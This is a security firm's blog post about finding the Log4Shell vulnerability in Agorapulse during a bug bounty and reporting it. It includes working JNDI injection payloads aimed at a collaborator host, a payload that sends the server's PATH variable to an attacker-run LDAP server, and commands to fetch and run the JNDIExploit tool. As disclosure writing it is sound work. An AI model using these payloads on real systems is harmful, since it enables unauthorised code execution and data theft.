---
layout: post
title:  "How did we Found Log4shell on Agorapulse"
author: snapsec
categories: [ log4shell,article]
image: assets/images/agora-log4j/0.png
---


Log4j is a logging framework for Java applications. It is a popular choice for developers looking for a simple and flexible logging solution. However, in the past Log4j has been found to be vulnerable to a number of security threats. The log4j library has recently been found to contain a serious vulnerability that went by the moniker of log4shell and gained widespread attention. This vulnerability allows unauthenticated remote code execution on vulnerable servers and may be exploited to expose sensitive information.

All Log4j versions from 2.0-beta9 through 2.12. 1, and 2.13. 0 through 2.14
Log4Shell vulnerability is a critical vulnerability, affecting Apache Log4j versions 2.0 to 2.14.1, [as identified by Chen Zhaojun of the Alibaba Cloud Security Team](https://www.bloomberg.com/news/articles/2021-12-13/how-apache-raced-to-fix-a-potentially-disastrous-software-flaw). NIST published a critical CVE in the National Vulnerability Database on December 10th, 2021, naming this [CVE-2021–44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). Apache Software Foundation assigned the maximum CVSS severity rating of 10.

This disclosure came storming into the security industry and havoc was created because all companies implementing this vulnerable framework were exploitable by this critical vulnerability. One can get an idea from the [analytics published](https://www.hackerone.com/vulnerability-management/log4shell-attack-evolution) by HackerOne which says, “Hackers have submitted over 2,000 Log4Shell reports to over 400 of our customers. The majority of reports were made in the first 14 days after the public disclosure of Log4 Shell". Almost the same number of reports were submitted on bugcrowd as well with over 300 reports submitted in a single day.



## What is agorapulse:

Agorapulse basically provides everything an organization could possibly need for social media marketing, monitoring, and management. Agora Pulse offers a comprehensive and compact platform for businesses to execute their marketing strategies while remaining under budget. The software is used to create and schedule social media content, engage audiences, listen for key terms, and analyze social media performance.


## How we found log4js on agorapulse:

It was the middle of the winter of 2021 when the news of log4j vulnerability broke out in the cyber security industry. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking, our company decided to focus wholly on exploiting this vulnerability.

Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. We plunged into research mode and figured out how we were going to scan for this vulnerability. Due to the fact that the vulnerability could be present on any endpoint or any request, it was really hard to focus on one part of an application. So we decided to inject payloads all over the web application and wait for any pingbacks. To do that, we identified features and functionalities where we could use our payloads.

As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application, and as said above to keep things organized, we used functionality-specific identifiers in the payloads.

For example

If we were using a payload in the profile-picture field we would use `${jndi:ldap://profilepic.<Your-Burp-Collab-URL>/a}` and if we were pasting a payload in the message box we used `${jndi:ldap://inbox.<Your-Burp-Collab-URL>/a}` and so on, It easily allowed us to identify the vulnerable request to trigger the vulnerability.


On the other hand, we also played it safe, using a payload that was not at all harmful to the client i.e did not result in any denial of service attack or executing any malicious commands inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the DNS pingbacks : `${jndi:ldap://<Your-Burp-Collab-URL>/a}`.

So now the identification process began, and after a while, we received two pingbacks. One of the received was a false positive. But next up, we had a DNS pingback that identified the presence of Log4shell vulnerability.


## Summarizing the Steps

So, the steps to reproduce were as follows

- Start Burp and create a new burp collaborator Client
- Now Login to agorapulse and click on `Publish` to publish a new post.

![x](/blog/assets/images/agora-log4j/1.png)



- Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}` and paste it in the Post Section.
- Now Select any profile from the left side and Publish the POST

![x](/blog/assets/images/agora-log4j/2.png)

- On going back to the burp collaborator client, you will see a Pingback.

![x](/blog/assets/images/agora-log4j/Three.png)


  
## Demonstration of Impact ( Remote Code Execution )


As mentioned in earlier sections, successful exploitation could lead to RCE. We refrained from taking any such action that could lead to any kind of disruption in services. So, we decided to prove the impact by extracting the global PATH variable to prove the real impact of the vulnerability, and we needed to set up a JNDI server for that. So we quickly set up an Amazon EC2 and set up a JNDI server using the following approach.

- SSH to your Server


```console
ssh user@<your-ip>
```

- Download and Install JNDI Server

```console
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
```
-Run the Exploit and you should see the following output on screen

```console
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <your-ip> -p 8888
```

After the following commands, we had our JDNI server running on our `ServerIP:8888`

As we went back to Agorapulse and made another post with this Payload : `${jndi:ldap://[ServerIp]:1389/${env:PATH}`

  
we were able just able to extract the environment variables of the server.


![x](/blog/assets/images/agora-log4j/4.png)
  

We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical. Hence, no sensitive, confidential, or any other information related to their users was extracted.


## Response of Agora Team

After submitting the report to the agora team, we got their first response within a day. They were responsive and concerned with the security of their online assets. They fixed the bug on the same day and rewarded our finding.

After their fix was implemented, the team requested a re-check on the vulnerability, and we tried various payloads and bypasses to confirm if the fix was working well. But we were unable to bypass the fix, and it was working fine, so we confirmed the fix.

  
  
> ⚠️ Agorapulse was one of the 14 companies Snapsec helped to detect and fix Log4shell on the day it was publicly disclosed. 

## About us

Snapsec is a Cyber security service company for rapidly growing SaaS businesses, we help you with an enhanced level of security to defend your critical networks and data at affordable charges for our services.

Please feel free to contact us at support@snapsec.com if you're seeking a company that appreciates your security and guarantees that you are completely protected from online security risks. 
 
